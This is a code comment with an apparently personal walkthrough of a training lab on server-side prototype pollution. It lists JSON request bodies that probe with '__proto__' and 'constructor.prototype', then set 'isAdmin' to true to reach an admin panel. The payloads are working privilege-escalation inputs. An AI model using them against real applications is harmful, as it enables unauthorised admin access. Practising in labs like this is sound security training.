/*

 To solve the lab:

    Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
    Identify a gadget property that you can use to escalate your privileges.
    Access the admin panel and delete the user carlos.

You can log in to your own account with the following credentials: wiener:peter 

1) 
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"xOGJLJAhP8J7lruFpxixSx7bDbJzOf3f",
    "__proto__":{
	    "json spaces":10
    }
}

the JSON indentation appears to be unaffected. 

2) 

{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"xOGJLJAhP8J7lruFpxixSx7bDbJzOf3f",
    "constructor":{
        "prototype":{
            "json spaces":10
}}
}

3) 
{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"xOGJLJAhP8J7lruFpxixSx7bDbJzOf3f",
    "constructor":{
        "prototype":
        {
            "isAdmin":true
}}
}

4) refresh

*/